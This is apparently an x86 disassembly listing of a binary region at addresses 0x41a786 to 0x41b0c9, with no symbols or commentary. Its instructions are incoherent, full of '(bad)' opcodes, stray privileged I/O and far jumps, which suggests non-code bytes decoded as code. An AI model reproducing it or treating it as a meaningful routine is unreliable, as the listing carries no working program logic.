  41a786:	mov    ch,0x10
  41a788:	scas   eax,DWORD PTR es:[edi]
  41a789:	adc    eax,0xe73fd340
  41a78e:	dec    esp
  41a78f:	aas    
  41a790:	sti    
  41a791:	fnsave [ebx]
  41a793:	je     0x41a74d
  41a795:	sub    ah,cl
  41a797:	arpl   WORD PTR [ecx],bx
  41a799:	inc    esi
  41a79a:	test   BYTE PTR [edx],bl
  41a79c:	mov    WORD PTR [ebx+0x3b],fs
  41a79f:	xor    eax,0xf6556e44
  41a7a4:	cmp    eax,0x10663222
  41a7a9:	adc    al,0x8a
  41a7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7ac:	(bad)  
  41a7ad:	repnz xor eax,0xc5a211d6
  41a7b3:	mov    dh,0x4a
  41a7b5:	out    dx,al
  41a7b6:	xchg   DWORD PTR [esi+0x48],edx
  41a7b9:	cmp    DWORD PTR [ecx-0x5e],edx
  41a7bc:	mov    cl,0xf7
  41a7be:	push   ecx
  41a7bf:	jne    0x41a745
  41a7c1:	imul   esp,DWORD PTR [edi-0x3fe4c22e],0xffffff8b
  41a7c8:	loop   0x41a7fb
  41a7ca:	or     ah,al
  41a7cc:	xor    eax,0x585af22b
  41a7d1:	adc    ch,ah
  41a7d3:	mov    al,ds:0xdf89b695
  41a7d8:	xor    eax,0xd7cf01fd
  41a7dd:	sub    edi,ebp
  41a7df:	push   0xffffffbe
  41a7e1:	sbb    esi,DWORD PTR ss:[ebp+0x9339b4a]
  41a7e8:	fsub   DWORD PTR [ebx-0x58]
  41a7eb:	call   0xf10f:0x3469b038
  41a7f2:	sub    bh,bl
  41a7f4:	bound  eax,QWORD PTR [ebx-0x2c]
  41a7f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7f8:	leave  
  41a7f9:	add    BYTE PTR [ecx+0x13253c13],dl
  41a7ff:	sar    cl,0xe
  41a802:	or     BYTE PTR [eax],ah
  41a804:	aam    0x72
  41a806:	sbb    edi,DWORD PTR [edx-0x21]
  41a809:	adc    BYTE PTR [ebx],dh
  41a80b:	retf   0xdc9e
  41a80e:	repnz imul ecx,DWORD PTR [edi],0xe3cffbb4
  41a815:	mov    gs,esp
  41a817:	mov    ?,WORD PTR [edx]
  41a819:	aaa    
  41a81a:	and    BYTE PTR [edi+0x7af16444],al
  41a820:	cdq    
  41a821:	inc    ecx
  41a822:	adc    al,0x16
  41a824:	and    BYTE PTR [eax-0x19],0x3b
  41a828:	xchg   edx,eax
  41a829:	xlat   BYTE PTR ds:[ebx]
  41a82a:	mov    BYTE PTR [esi+0x6f],ch
  41a82d:	lds    ebp,FWORD PTR [edx-0x74b458db]
  41a833:	adc    al,0x19
  41a835:	lods   al,BYTE PTR ds:[esi]
  41a836:	icebp  
  41a837:	sub    al,0xb3
  41a839:	adc    DWORD PTR [esi+eiz*4],0xd7997a3e
  41a840:	mov    eax,DWORD PTR [ebp+0x3c202812]
  41a846:	neg    DWORD PTR [ecx+ebx*8+0x1e]
  41a84a:	(bad)  
  41a84b:	ror    DWORD PTR [ebx-0x5b],1
  41a84e:	and    al,0x27
  41a850:	into   
  41a851:	bound  edx,QWORD PTR [edx-0xc]
  41a854:	dec    ecx
  41a855:	lods   al,BYTE PTR ds:[esi]
  41a856:	xor    edx,DWORD PTR [ebx+0x64]
  41a859:	mov    ecx,0x461abe84
  41a85e:	inc    eax
  41a85f:	loop   0x41a7e4
  41a861:	popf   
  41a862:	call   0x98a8:0xd5dfa512
  41a869:	inc    edx
  41a86a:	mov    dl,0xd4
  41a86c:	pop    esp
  41a86d:	scas   eax,DWORD PTR es:[edi]
  41a86e:	or     esi,ebp
  41a870:	inc    edx
  41a871:	mov    al,0x8d
  41a873:	pop    ebp
  41a874:	cmc    
  41a875:	imul   edi,DWORD PTR [edi+0x428f01fc],0xffffffc4
  41a87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a87d:	jmp    0x1a34b9bb
  41a882:	pop    ebp
  41a883:	add    eax,0x9a020978
  41a888:	xchg   esi,eax
  41a889:	push   ebx
  41a88a:	sti    
  41a88b:	add    eax,0x2862670c
  41a890:	sub    DWORD PTR [esi-0x3d],ebp
  41a893:	ins    DWORD PTR es:[edi],dx
  41a894:	xor    al,ah
  41a896:	jmp    0x2a08:0x63833a3f
  41a89d:	lods   eax,DWORD PTR ds:[esi]
  41a89e:	fild   QWORD PTR [ecx+0x74]
  41a8a1:	jnp    0x41a8b1
  41a8a3:	dec    DWORD PTR [edi-0x7a]
  41a8a6:	dec    ecx
  41a8a7:	or     esi,DWORD PTR [ebp-0xcd04635]
  41a8ad:	popa   
  41a8ae:	in     al,dx
  41a8af:	sti    
  41a8b0:	call   FWORD PTR [edx+0x573a7b5c]
  41a8b6:	popa   
  41a8b7:	mov    ch,0xa
  41a8b9:	test   BYTE PTR ds:0x6d988708,ah
  41a8bf:	push   0x8fd0332e
  41a8c4:	loop   0x41a855
  41a8c6:	ror    DWORD PTR [edx-0x6d],0x37
  41a8ca:	ficomp WORD PTR [ecx]
  41a8cc:	lods   al,BYTE PTR ds:[esi]
  41a8cd:	ds test al,0x3a
  41a8d0:	imul   edi,ecx,0x43b77523
  41a8d6:	push   esi
  41a8d7:	rcr    BYTE PTR [ebx],1
  41a8d9:	mov    DWORD PTR [edi],edx
  41a8db:	(bad)
  41a8de:	adc    al,cl
  41a8e0:	outs   dx,DWORD PTR ds:[esi]
  41a8e1:	pop    edi
  41a8e2:	or     ch,bh
  41a8e4:	loop   0x41a931
  41a8e6:	mov    bl,0x36
  41a8e8:	dec    eax
  41a8e9:	xchg   ebp,eax
  41a8ea:	aaa    
  41a8eb:	mov    eax,DWORD PTR [ebx]
  41a8ed:	loopne 0x41a967
  41a8ef:	jecxz  0x41a92e
  41a8f1:	out    dx,eax
  41a8f2:	adc    BYTE PTR [edx-0x10a2b661],bl
  41a8f8:	adc    BYTE PTR [edx-0x1c27d7c],bl
  41a8fe:	mov    BYTE PTR [ecx-0x6756d44d],0x94
  41a905:	dec    ebx
  41a906:	mov    edx,0x171765b9
  41a90b:	or     al,0x79
  41a90d:	fst    DWORD PTR [edx-0x71]
  41a910:	inc    esi
  41a911:	mov    eax,0x114a08e2
  41a916:	aaa    
  41a917:	mov    gs,WORD PTR [ebx+ecx*2+0x78]
  41a91b:	mov    ebx,0x21e90e53
  41a920:	jno    0x41a8da
  41a922:	into   
  41a923:	cdq    
  41a924:	sbb    cl,ah
  41a926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a927:	stc    
  41a928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a929:	imul   edx,DWORD PTR [eax],0x8fe9e37b
  41a92f:	dec    ecx
  41a930:	add    edx,DWORD PTR [esi-0x2d]
  41a933:	cmp    eax,0xbcfb147b
  41a938:	int3   
  41a939:	lahf   
  41a93a:	push   cs
  41a93b:	js     0x41a9b8
  41a93d:	and    DWORD PTR [eax+ecx*1-0x370e47de],esi
  41a944:	gs sbb al,0xd3
  41a947:	adc    edx,DWORD PTR [ecx+ebp*8-0x34777e9e]
  41a94e:	test   dl,0x68
  41a951:	(bad)  
  41a952:	icebp  
  41a953:	or     dl,BYTE PTR [esi-0x3dda7914]
  41a959:	out    dx,al
  41a95a:	ds sub al,0xb4
  41a95d:	push   esi
  41a95e:	adc    ch,BYTE PTR [ecx+0x6c54369a]
  41a964:	mov    bh,0xd6
  41a966:	or     al,0x57
  41a968:	lods   al,BYTE PTR ds:[esi]
  41a969:	call   0x6b26dec3
  41a96e:	out    0x10,al
  41a970:	sub    BYTE PTR [edi-0x21],dl
  41a973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a974:	xchg   bh,dl
  41a976:	rcr    DWORD PTR [edi+0x669d1b47],cl
  41a97c:	add    BYTE PTR [ebp+0x42],cl
  41a97f:	aaa    
  41a980:	stos   BYTE PTR es:[edi],al
  41a981:	cs jbe 0x41a9c2
  41a984:	clc    
  41a985:	mov    ?,WORD PTR ds:0xdbdb4d45
  41a98b:	inc    eax
  41a98c:	aaa    
  41a98d:	js     0x41a942
  41a98f:	daa    
  41a990:	cmc    
  41a991:	fadd   DWORD PTR [esi]
  41a993:	leave  
  41a994:	test   eax,0x1bad5ca
  41a999:	jno    0x41a990
  41a99b:	cmp    DWORD PTR [esi+0x7c],esp
  41a99e:	xchg   ebp,eax
  41a99f:	sub    bh,BYTE PTR [ebx+0x67af949f]
  41a9a5:	pop    ss
  41a9a6:	mov    ah,0xc4
  41a9a8:	mov    edx,0x54d19e67
  41a9ad:	nop
  41a9ae:	call   0xdc8a:0x257f949d
  41a9b5:	imul   esp,DWORD PTR [edx+ecx*8+0x6b],0xf8759c47
  41a9bd:	rol    ah,cl
  41a9bf:	into   
  41a9c0:	cmp    al,0x61
  41a9c2:	push   ebx
  41a9c3:	pushf  
  41a9c4:	fcomp  QWORD PTR [edi-0x2f]
  41a9c7:	xchg   ebp,eax
  41a9c8:	sub    edx,DWORD PTR [ecx+0x6b]
  41a9cb:	(bad)  [edi]
  41a9cd:	or     DWORD PTR [edx+0x53],edx
  41a9d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d1:	lahf   
  41a9d2:	addr16 cmc 
  41a9d4:	jno    0x41a9a9
  41a9d6:	add    ebx,DWORD PTR [ecx]
  41a9d8:	imul   eax,edx,0x6d0808a8
  41a9de:	mov    ds:0xc34d749f,eax
  41a9e3:	test   DWORD PTR [edx+ebp*1],edx
  41a9e6:	and    BYTE PTR [eax+0x41],0xf2
  41a9ea:	pop    esi
  41a9eb:	inc    edx
  41a9ec:	(bad)  
  41a9ed:	jmp    0x55ee:0x11168345
  41a9f4:	in     al,0xa
  41a9f6:	jne    0x41a991
  41a9f8:	pop    ebx
  41a9f9:	or     al,BYTE PTR [eax+eiz*8]
  41a9fc:	cwde   
  41a9fd:	sub    ch,BYTE PTR [edi]
  41a9ff:	nop
  41aa00:	push   esi
  41aa01:	cld    
  41aa02:	jbe    0x41a9d5
  41aa04:	jg     0x41aa22
  41aa06:	jb     0x41a9de
  41aa08:	add    ebx,ebx
  41aa0a:	test   eax,0x19756977
  41aa0f:	pop    ebp
  41aa10:	xchg   ah,ch
  41aa12:	or     eax,0x70f59643
  41aa17:	push   ss
  41aa18:	fld    DWORD PTR [ebp-0xf]
  41aa1b:	aaa    
  41aa1c:	mov    al,0x3c
  41aa1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa1f:	cmp    al,0x3c
  41aa21:	iret   
  41aa22:	xor    eax,0x852f407d
  41aa27:	cdq    
  41aa28:	mov    edx,0x5932695e
  41aa2d:	mov    WORD PTR ds:0xcff3aa6d,cs
  41aa33:	test   al,0xce
  41aa35:	retf   
  41aa36:	xor    BYTE PTR [ebx+0x6cb0acb4],dh
  41aa3c:	lds    eax,FWORD PTR [ecx-0x1f]
  41aa3f:	fstp   QWORD PTR [eax+0x15]
  41aa42:	ret    
  41aa43:	jmp    0xdc66c27
  41aa48:	push   ecx
  41aa49:	lock cwde 
  41aa4b:	shl    edi,cl
  41aa4d:	scas   eax,DWORD PTR es:[edi]
  41aa4e:	xor    BYTE PTR [ebx-0x26],ch
  41aa51:	(bad)  
  41aa52:	xor    ebx,DWORD PTR [esi-0xb]
  41aa55:	push   eax
  41aa56:	imul   eax,DWORD PTR [eax],0x5d
  41aa59:	cs pop ss
  41aa5b:	add    ch,ch
  41aa5d:	pop    ss
  41aa5e:	scas   al,BYTE PTR es:[edi]
  41aa5f:	xchg   ecx,eax
  41aa60:	(bad)  
  41aa61:	popa   
  41aa62:	sbb    ch,ch
  41aa64:	call   0xce3a:0x3a5f8b48
  41aa6b:	sbb    BYTE PTR [ebp+0x62],al
  41aa6e:	add    ecx,DWORD PTR [edi+0x3e]
  41aa71:	ds push ecx
  41aa73:	add    eax,0x80198898
  41aa78:	xchg   ebx,eax
  41aa79:	clc    
  41aa7a:	xor    al,0xe4
  41aa7c:	cmp    esi,DWORD PTR [ecx]
  41aa7e:	ja     0x41aa4d
  41aa80:	loope  0x41aab2
  41aa82:	mov    bh,0xc0
  41aa84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa85:	mov    ds:0x6a430287,al
  41aa8a:	push   ebx
  41aa8b:	push   0xffffffe3
  41aa8d:	add    eax,0x97c2e3cc
  41aa92:	scas   al,BYTE PTR es:[edi]
  41aa93:	sbb    al,0x88
  41aa95:	aas    
  41aa96:	or     ah,dh
  41aa98:	cdq    
  41aa99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa9a:	push   cs
  41aa9b:	add    BYTE PTR [esi+0x12],dh
  41aa9e:	pop    esi
  41aa9f:	pop    edx
  41aaa0:	push   ss
  41aaa1:	dec    ebp
  41aaa2:	es hlt 
  41aaa4:	push   edx
  41aaa5:	fidiv  DWORD PTR [esp+ecx*8]
  41aaa8:	add    eax,DWORD PTR [esi-0x15]
  41aaab:	inc    esp
  41aaac:	push   edx
  41aaad:	dec    ebp
  41aaae:	dec    ebx
  41aaaf:	and    BYTE PTR [eax],ch
  41aab1:	mov    ch,0x7
  41aab3:	push   es
  41aab4:	sub    al,0x53
  41aab6:	rcr    eax,cl
  41aab8:	mov    ebx,0x26a67991
  41aabd:	mov    dl,BYTE PTR [edi-0x7b0fb206]
  41aac3:	mov    dh,0x9c
  41aac5:	xor    DWORD PTR [eax+ecx*8-0x3a5c652b],ecx
  41aacc:	(bad)  
  41aacd:	scas   al,BYTE PTR es:[edi]
  41aace:	lds    edi,FWORD PTR [ebp+0x1e372f37]
  41aad4:	jno    0x41aa84
  41aad6:	leave  
  41aad7:	ror    ch,cl
  41aad9:	mov    edi,0xe8e5ea72
  41aade:	adc    al,0xa4
  41aae0:	gs std 
  41aae2:	in     eax,dx
  41aae3:	jle    0x41aa6e
  41aae5:	popa   
  41aae6:	rol    edx,1
  41aae8:	shl    BYTE PTR [ecx+0x10],0xef
  41aaec:	mov    ah,0xab
  41aaee:	inc    ebp
  41aaef:	sahf   
  41aaf0:	jae    0x41aae6
  41aaf2:	out    dx,al
  41aaf3:	xor    DWORD PTR [edi-0x755975b8],eax
  41aaf9:	mov    esp,0x69953474
  41aafe:	push   ecx
  41aaff:	and    BYTE PTR [ecx],ah
  41ab01:	repz jae 0x41ab1a
  41ab04:	out    dx,al
  41ab05:	test   DWORD PTR [eax],0x364700e3
  41ab0b:	or     cl,BYTE PTR [edx]
  41ab0d:	rcl    DWORD PTR [ebx-0x78355d9a],cl
  41ab13:	loopne 0x41ab04
  41ab15:	inc    ebx
  41ab16:	xlat   BYTE PTR ds:[ebx]
  41ab17:	lds    eax,FWORD PTR [esi+edi*8-0x18]
  41ab1b:	mov    eax,DWORD PTR [ecx]
  41ab1d:	call   0xb050:0x1081c1bc
  41ab24:	inc    ebx
  41ab25:	push   ds
  41ab26:	jp     0x41ab04
  41ab28:	js     0x41ab48
  41ab2a:	repz jecxz 0x41ab8d
  41ab2d:	jne    0x41aafe
  41ab2f:	adc    ah,dl
  41ab31:	retf   0x4024
  41ab34:	ins    BYTE PTR es:[edi],dx
  41ab35:	mov    esp,0xb4c9bf75
  41ab3a:	js     0x41ab5b
  41ab3c:	inc    esp
  41ab3d:	and    DWORD PTR [ebp+0x70],eax
  41ab40:	sub    BYTE PTR [esi+0x51e89276],ch
  41ab46:	inc    edx
  41ab47:	outs   dx,DWORD PTR ds:[esi]
  41ab48:	push   ds
  41ab49:	iret   
  41ab4a:	mov    ebx,0xb1157a40
  41ab4f:	or     al,0xde
  41ab51:	test   DWORD PTR [ebx],eax
  41ab53:	scas   al,BYTE PTR es:[edi]
  41ab54:	fisttp DWORD PTR [esi+eiz*8]
  41ab57:	int3   
  41ab58:	mov    ch,0x31
  41ab5a:	cli    
  41ab5b:	or     ch,ch
  41ab5d:	jmp    0x41abb5
  41ab5f:	push   ss
  41ab60:	sbb    DWORD PTR [eax+0x61],0x64
  41ab64:	leave  
  41ab65:	fsubr  DWORD PTR [edi]
  41ab67:	rcr    BYTE PTR [ebp-0x4adc9d4b],1
  41ab6d:	jecxz  0x41aaef
  41ab6f:	xchg   edx,eax
  41ab70:	jmp    0x1bfd:0xa20c1810
  41ab77:	lods   eax,DWORD PTR ds:[esi]
  41ab78:	mov    ds:0x3f98636b,eax
  41ab7d:	inc    edi
  41ab7e:	dec    DWORD PTR [edi+esi*8-0x50d55d4f]
  41ab85:	pop    ebp
  41ab86:	or     DWORD PTR [edx],esp
  41ab88:	jecxz  0x41abed
  41ab8a:	js     0x41abf5
  41ab8c:	mov    esi,esp
  41ab8e:	sub    BYTE PTR [eax],ch
  41ab90:	push   edi
  41ab91:	jae    0x41ab30
  41ab93:	je     0x41ab29
  41ab95:	or     DWORD PTR [edx],0xffffffcc
  41ab98:	pop    ss
  41ab99:	push   es
  41ab9a:	mov    ds:0xc7c4ab69,al
  41ab9f:	(bad)  
  41aba0:	mov    ecx,0x28772e5e
  41aba5:	mov    cl,0x85
  41aba7:	cli    
  41aba8:	xchg   DWORD PTR [ebp-0x53],esp
  41abab:	dec    eax
  41abac:	push   ebx
  41abad:	sub    ch,BYTE PTR [ebp+0x5476a381]
  41abb3:	mov    ecx,0xcf07c470
  41abb8:	stos   BYTE PTR es:[edi],al
  41abb9:	sub    eax,0xf16f0f24
  41abbe:	inc    eax
  41abbf:	fiadd  WORD PTR [ecx-0x2cc0b086]
  41abc5:	clc    
  41abc6:	fs dec ebp
  41abc8:	mov    esp,0x3b9029b6
  41abcd:	test   BYTE PTR [ebp+0x34cd00d2],0xe1
  41abd4:	call   0xa464:0xd7856c8f
  41abdb:	inc    ebp
  41abdc:	or     esi,DWORD PTR [esi+ebp*4-0x62c824f2]
  41abe3:	dec    eax
  41abe4:	xor    ebx,DWORD PTR [ebx-0x54]
  41abe7:	jmp    0xd57cbe4d
  41abec:	(bad)  
  41abed:	rol    BYTE PTR [ebx+0x10],1
  41abf0:	push   0xae449ca4
  41abf5:	pop    ebx
  41abf6:	adc    dh,cl
  41abf8:	or     al,0x4b
  41abfa:	pop    es
  41abfb:	pop    eax
  41abfc:	mov    al,ds:0xd0d3f2df
  41ac01:	cdq    
  41ac02:	jb     0x41ac10
  41ac04:	inc    eax
  41ac05:	push   ecx
  41ac06:	mov    al,0x63
  41ac08:	out    0x57,al
	...
  41adde:	and    eax,0x55d31474
  41ade3:	repz out 0xf6,eax
  41ade6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ade7:	adc    bh,BYTE PTR [esi]
  41ade9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adea:	pop    eax
  41adeb:	call   0xff133e56
  41adf0:	add    DWORD PTR [eax],eax
  41adf2:	and    al,BYTE PTR [edi]
  41adf4:	add    BYTE PTR [eax],al
  41adf6:	imul   ebp,DWORD PTR [ebx+0x45],0xd9d37123
  41adfd:	mov    edi,0x2c38c5b
  41ae02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae03:	pop    edi
  41ae04:	and    edx,DWORD PTR [edi+0x5e2e8626]
  41ae0a:	aas    
  41ae0b:	cmp    al,0xa7
  41ae0d:	sub    ah,BYTE PTR ds:0xdb8d58dd
  41ae13:	jl     0x41ae04
  41ae15:	imul   edi,DWORD PTR [ebp+0x40],0x34
  41ae19:	inc    esi
  41ae1a:	dec    eax
  41ae1b:	rcl    BYTE PTR [esi+0x71],1
  41ae1e:	jbe    0x41ae92
  41ae20:	dec    esp
  41ae21:	dec    ebp
  41ae22:	adc    al,0x2e
  41ae24:	lock arpl WORD PTR [ebx+0x3d],ax
  41ae28:	sub    esp,ecx
  41ae2a:	(bad)  
  41ae2c:	mov    esp,0xf329779f
  41ae31:	popa   
  41ae32:	bound  ebp,QWORD PTR [edi-0x4e]
  41ae35:	xor    dh,BYTE PTR [edx]
  41ae37:	or     al,0x22
  41ae39:	xor    ecx,esi
  41ae3b:	mov    eax,ds:0xd40c0b1c
  41ae40:	xchg   esi,eax
  41ae41:	jmp    0xa5ef:0xe3e5bab
  41ae48:	push   ecx
  41ae49:	cmp    eax,0xce19b275
  41ae4e:	mulps  xmm5,XMMWORD PTR [edx]
  41ae51:	ja     0x41add6
  41ae53:	pop    ecx
  41ae54:	in     al,0x79
  41ae56:	mov    eax,gs:0x30617984
  41ae5c:	mov    ebx,0xfd43415c
  41ae61:	mov    ds:0x723eed81,al
  41ae66:	mov    ecx,eax
  41ae68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae69:	mov    eax,0xfc4c1db6
  41ae6e:	push   esp
  41ae6f:	test   al,0x44
  41ae72:	mov    ecx,0x91ac5f53
  41ae77:	adc    DWORD PTR [edi+eiz*1+0x39c96f89],0xffffffd6
  41ae7f:	sub    esp,DWORD PTR [edx+ecx*4]
  41ae82:	lea    eax,[ebx-0x4f]
  41ae85:	cdq    
  41ae86:	iret   
  41ae87:	stos   BYTE PTR es:[edi],al
  41ae88:	or     eax,0xd43f563e
  41ae8d:	bound  ebx,QWORD PTR [edi]
  41ae8f:	sbb    al,0xa5
  41ae91:	rcl    DWORD PTR [ecx],0xb8
  41ae94:	jmp    0x41ae57
  41ae96:	ds sahf 
  41ae98:	rcr    BYTE PTR [edx],0xdf
  41ae9b:	inc    eax
  41ae9c:	and    DWORD PTR [edi],edx
  41ae9e:	nop
  41ae9f:	jae    0x41aed5
  41aea1:	sti    
  41aea2:	ds mov dl,0x4
  41aea5:	(bad)  
  41aea6:	mov    ch,0x14
  41aea8:	add    BYTE PTR [ebx+ebx*1-0x64],0x54
  41aead:	outs   dx,DWORD PTR ds:[esi]
  41aeae:	(bad)  
  41aeaf:	adc    al,0xf4
  41aeb1:	add    al,BYTE PTR ds:0x1c21fb7f
  41aeb7:	xchg   edx,eax
  41aeb8:	cwde   
  41aeb9:	mov    ch,0xc
  41aebb:	ret    
  41aebc:	mov    esi,0xcc536356
  41aec1:	cld    
  41aec2:	or     BYTE PTR [eax],bh
  41aec4:	sbb    edi,esi
  41aec6:	scas   al,BYTE PTR es:[edi]
  41aec7:	js     0x41aee6
  41aec9:	jno    0x41aece
  41aecb:	(bad)  
  41aecc:	stc    
  41aecd:	das    
  41aece:	jmp    0x41aee7
  41aed0:	fbld   TBYTE PTR [ebp-0x75]
  41aed3:	xor    eax,0x1bd9e074
  41aed8:	test   dh,dh
  41aeda:	js     0x41af0f
  41aedc:	and    eax,0x125e2936
  41aee1:	inc    ecx
  41aee2:	mov    al,ds:0xd111d06e
  41aee7:	(bad)  
  41aee8:	minps  xmm3,XMMWORD PTR [edi+0x24f38367]
  41aeef:	dec    eax
  41aef0:	push   ebx
  41aef1:	jmp    0x847:0x5215b688
  41aef8:	pop    ss
  41aef9:	add    DWORD PTR es:[edx+0xf3ff65],0x1a8f0e66
  41af04:	add    al,0x79
  41af06:	(bad)  
  41af07:	xchg   ecx,eax
  41af08:	jmp    DWORD PTR ss:[edx-0x7]
  41af0c:	xor    eax,edi
  41af0e:	pop    esp
  41af0f:	aad    0xca
  41af11:	sti    
  41af12:	mov    eax,eax
  41af14:	and    dh,BYTE PTR [edi+eiz*4+0x72d20461]
  41af1b:	cwde   
  41af1c:	sub    eax,0x9ccb00bf
  41af21:	cld    
  41af22:	leave  
  41af23:	fs mov bl,0x89
  41af26:	aam    0x89
  41af28:	push   0x0
  41af2a:	shl    BYTE PTR [edx],1
  41af2c:	int    0x38
  41af2e:	mov    bl,0x43
  41af30:	xchg   ebx,eax
  41af31:	and    DWORD PTR ds:0xcbe76a32,ebx
  41af37:	dec    eax
  41af38:	rcr    BYTE PTR [ecx-0x67ec2f82],1
  41af3e:	repz mov ebx,0xf64d21ee
  41af44:	outs   dx,BYTE PTR ds:[esi]
  41af45:	push   ds
  41af46:	pop    ecx
  41af47:	mov    al,ds:0xa79320a7
  41af4c:	sbb    ch,BYTE PTR [edi]
  41af4e:	mov    eax,ds:0x6caa5c95
  41af53:	mov    dh,0x78
  41af55:	call   0xf8c3:0x744efce2
  41af5c:	add    ebp,DWORD PTR ds:0x16267e00
  41af62:	cmc    
  41af63:	mov    sp,0x38db
  41af67:	and    eax,DWORD PTR [esi]
  41af69:	adc    ch,BYTE PTR [edi+edi*8-0x67de00e6]
  41af70:	icebp  
  41af71:	jl     0x41afbc
  41af73:	xor    dh,BYTE PTR [esi+0x2e]
  41af76:	push   eax
  41af77:	call   0x51ee:0x55bcc2ce
  41af7e:	push   ss
  41af7f:	iret   
  41af80:	jb     0x41af86
  41af82:	sbb    eax,0xc4d89b14
  41af87:	test   al,0x65
  41af89:	popf   
  41af8a:	dec    ebp
  41af8b:	inc    edi
  41af8c:	pop    eax
  41af8d:	adc    BYTE PTR [edx+ebx*1+0x5f],al
  41af91:	leave  
  41af92:	mov    cl,0xa7
  41af94:	bound  ecx,QWORD PTR [esi]
  41af96:	dec    esp
  41af97:	loope  0x41b000
  41af99:	push   ds
  41af9a:	retf   
  41af9b:	jle    0x41afc7
  41af9d:	inc    eax
  41af9e:	js     0x41af90
  41afa0:	dec    edx
  41afa1:	adc    ch,dh
  41afa3:	or     ecx,edx
  41afa5:	or     DWORD PTR [esp+eax*8-0x5a],0x44
  41afaa:	xor    BYTE PTR [esi-0x7c],al
  41afad:	jmp    0xeadcafe3
  41afb2:	cmp    eax,0xd734ebad
  41afb7:	or     BYTE PTR [ebx-0x4b4c9b1c],0xdb
  41afbe:	inc    esi
  41afbf:	aam    0x33
  41afc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afc2:	push   edx
  41afc3:	dec    edi
  41afc4:	push   ds
  41afc5:	xchg   BYTE PTR [edi+eax*8],ah
  41afc8:	cwde   
  41afc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afca:	lds    ecx,FWORD PTR [ebx+0x52560851]
  41afd0:	adc    eax,DWORD PTR [ebx+ebp*1-0x4b465c7d]
  41afd7:	cdq    
  41afd8:	jl     0x41b046
  41afda:	mov    bh,0x2b
  41afdc:	aad    0x7
  41afde:	(bad)  
  41afdf:	jnp    0x41affd
  41afe1:	cs pusha 
  41afe3:	cwde   
  41afe4:	aad    0xeb
  41afe6:	iret   
  41afe7:	aad    0x37
  41afe9:	mov    WORD PTR [eax],ds
  41afeb:	xchg   esp,eax
  41afec:	sbb    ah,BYTE PTR [eax-0x6d]
  41afef:	fadd   st(6),st
  41aff1:	mov    bl,0x8
  41aff3:	popa   
  41aff4:	cwde   
  41aff5:	ret    0x6635
  41aff8:	mov    dl,0x9b
  41affa:	sbb    edx,DWORD PTR [esi+0x2e75f8c5]
  41b000:	out    dx,eax
  41b001:	mov    edi,0xa1553705
  41b006:	inc    ecx
  41b007:	inc    edx
  41b008:	and    ch,BYTE PTR [ebx+0x7a3ea3da]
  41b00e:	icebp  
  41b00f:	(bad)  
  41b010:	call   0x96d7d93c
  41b015:	and    esi,DWORD PTR [eax+0x549da28e]
  41b01b:	ins    DWORD PTR es:[edi],dx
  41b01c:	sbb    eax,0xd3c5dfe8
  41b021:	nop
  41b022:	push   esp
  41b023:	cmc    
  41b024:	(bad)  
  41b025:	sbb    al,0x8
  41b027:	mov    WORD PTR [ecx+0x36],gs
  41b02a:	(bad)  
  41b02b:	icebp  
  41b02c:	in     eax,dx
  41b02d:	xchg   esp,eax
  41b02e:	lds    esi,FWORD PTR fs:[ecx+0x33]
  41b032:	das    
  41b033:	bts    esp,ebp
  41b036:	jnp    0x41b046
  41b038:	inc    eax
  41b039:	add    eax,0x3ba6cd2c
  41b03e:	and    eax,0x19369b46
  41b043:	mov    al,ds:0x4f702f58
  41b048:	pop    es
  41b049:	bound  ebx,QWORD PTR [esi+edx*8]
  41b04c:	push   esi
  41b04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b04f:	mov    eax,0x49d85042
  41b054:	sub    DWORD PTR [edx],ebx
  41b056:	xchg   ch,bl
  41b058:	cmp    al,0xf0
  41b05a:	fbstp  TBYTE PTR [esi-0x792e245c]
  41b060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b061:	mov    esi,0x6f6228fb
  41b066:	ret    
  41b067:	icebp  
  41b068:	sub    eax,0x200aa182
  41b06d:	adc    dh,BYTE PTR [esi-0x4e2b2792]
  41b073:	jp     0x41b0d5
  41b075:	cmp    dl,dl
  41b077:	inc    esi
  41b078:	rcr    DWORD PTR [ebp+0x6f],0x24
  41b07c:	mov    ?,WORD PTR [ecx]
  41b07e:	imul   eax,ebx,0xf8cf3785
  41b084:	lods   eax,DWORD PTR ds:[esi]
  41b085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b086:	push   ecx
  41b087:	popf   
  41b088:	xchg   ebp,eax
  41b089:	sub    DWORD PTR [ebx],ebp
  41b08b:	sub    eax,0x79881f48
  41b090:	pop    es
  41b091:	std    
  41b092:	dec    esi
  41b093:	rcr    BYTE PTR [ebx+0x31c8b887],0x31
  41b09a:	or     esp,DWORD PTR [ecx]
  41b09c:	or     eax,DWORD PTR [edi-0x6d]
  41b09f:	xor    ch,dh
  41b0a1:	inc    eax
  41b0a2:	test   DWORD PTR [esi+0x18],ebp
  41b0a5:	mov    dh,0x7b
  41b0a7:	iret   
  41b0a8:	loope  0x41b102
  41b0aa:	scas   eax,DWORD PTR es:[edi]
  41b0ab:	mov    ds:0x9e9630cb,al
  41b0b0:	jmp    0x89f90918
  41b0b5:	out    dx,eax
  41b0b6:	in     eax,dx
  41b0b7:	or     BYTE PTR [ecx+0x14302619],ah
  41b0bd:	loope  0x41b067
  41b0bf:	mov    bh,0x1c
  41b0c1:	sub    ebp,edx
  41b0c3:	push   ds
  41b0c4:	mov    esi,0xb54ea64b
  41b0c9:	push   ds
